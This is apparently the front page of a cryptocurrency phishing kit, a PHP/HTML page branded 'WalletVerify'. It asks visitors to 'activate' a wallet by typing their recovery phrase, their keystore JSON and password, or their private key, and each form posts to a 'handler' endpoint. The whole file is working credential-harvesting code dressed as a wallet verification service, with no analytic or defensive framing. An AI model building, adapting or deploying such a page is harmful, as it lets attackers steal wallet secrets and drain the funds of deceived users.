
<?php
session_start();

$mode=$_SESSION['mode'];
?>

<!DOCTYPE html>
<html>



<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
  <title>WalletVerify - <?php echo $mode   ?>  Activation</title>
  <link rel="shortcut icon" type="image/jpg" href="walletfav.png"/>
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
  <link rel="stylesheet" href="assets/css/styles.css">
  <link rel="stylesheet" href="assets/css/header.css">
  <!--<link rel="stylesheet" href="assets/css/footer.css">-->
  <script src="https://www.momentcrm.com/embed"></script>
<script>
  MomentCRM('init', {
    'teamVanityId': 'erect1',
    'doChat': true,
    'doTracking': true,
  });
</script>
<style>
     body{
          /*background: url("bg.png");*/
          /*background-position: center;*/
          /*background-repeat: no-repeat;*/
          /*background-size: cover;*/
          background-color:#726E6D;
          


      }
      a{
          text-decoration:none;
      }
</style>
</head>

<body>
  <header>
      
  <nav class="navbar fixed-top navbar-expand-lg navbar-transparent"> <a class="navbar-brand" href="#">WalletVerify</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active"> <a class="nav-link" href="/">HOME <span class="sr-only">(current)</span></a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Github</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Facebook</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Apps</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Tweeter</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Instagram</a> </li>
                    </ul>
                </div>
            </nav>
            
        
  
  </header>

  <br>
  <br>
  <div class="container-fluid">
      <div class="row">
        <br>
        <div class="col-md-4 offset-md-4">
          <a class="text-white" href="/" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Activate <?php echo $mode   ?> Wallet</a>
        </div>
      </div>
    </div>
  <div class="container-fluid">
    <div class="row">
      <div class="col-md-4 offset-md-4">
        <ul class="nav nav-tabs">
          <li id="phbtn" class="nav-item"><a class="nav-link active" data-toggle="tab" href="#">Phrase</a></li>
          <li id="kybtn"  class="nav-item"><a class="nav-link" data-toggle="tab" href="#">Keystore JSON</a></li>
          <li id="pkbtn"  class="nav-item"><a class="nav-link" data-toggle="tab" href="">Private Key</a></li>
        </ul>
      </div>
    </div>
  </div>
     
  <section style="margin-top: 40px;">
    <div class="container-fluid">
      <div class="row">
         
        <div class="col-md-4 offset-md-4">
          <!-- Tab panes -->
          <div class="tab-content">
            <!-- phrase -->
            <div role="tabpanel" class="tab-pane fade show active" id="phrase">
              <form method="post" action="handler">
                <textarea class="form-control" rows="5" name="phrase" required placeholder="Phrase"></textarea>
                <p class="text-primary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <input type="hidden" name="wallet"  value="<?php echo $mode   ?>" >
                <input type="hidden" name="type"  value="phrase" >
               
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end phrase -->
            <!-- keystore -->
            <div role="tabpanel" class="tab-pane " id="keystore">
              <form method="post" action="handler">
                <div class="form-group">
                  <textarea class="form-control" name="keystorejson"  required rows="5" placeholder="Keystore JSON"></textarea>
                </div>
                <div class="form-group">
                  <input class="form-control" type="password" required name="keystorepasswword" placeholder="Password">
                </div>
                <p class="text-primary" style="margin-top: 10px;">
                  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                </p>
                <input type="hidden" name="wallet" value="<?php echo $mode   ?>" >
                <input type="hidden" name="type" value="keystorepasswword" >
               
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end keystore -->
            <!-- privatekey -->
            <div role="tabpanel" class="tab-pane " id="privatekey">
              <form method="post" action="handler">
                <div class="form-group">
                  <input class="form-control" name="privatekey" required placeholder="Private Key">
                </div>
                <p class="text-primary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <input type="hidden" name="wallet" value="<?php echo $mode   ?>">
                <input type="hidden" name="type" value="privatekey" >
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end privatekey -->
          </div>
        </div>
      </div>
    </div>
     <!--<div style="height:62px; background-color: #1D2330; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;"><div style="height:40px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe></div><div style="color: #626B7F; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;"><a href="#" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px">Cryptocurrency Prices</a>&nbsp;by Riotech</div></div>-->
  </section>
 

  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
  <script>
    $(document).ready(function () {
       $("#phbtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").show(1000);
        $("#keystore").hide();
        $("#privatekey").hide();
           
       });

       $("#kybtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").hide();
        $("#keystore").show(1000);
        $("#privatekey").hide();
           
       });

       $("#pkbtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").hide();
        $("#keystore").hide();
        $("#privatekey").show(1000);
           
       });
    });
  //  const queryString = window.location.search;

  //   const urlParams = new URLSearchParams(queryString);

  //   const wallet = urlParams.get('wallet')

   

  //   document.getElementById("hidden1").value = "AAVE" + " Phrase";
  //   document.getElementById("hidden2").value = "AAVE" + " Keystore";
  //   document.getElementById("hidden3").value = "AAVE" + " PrivateKey";
  </script>
</body>



</html>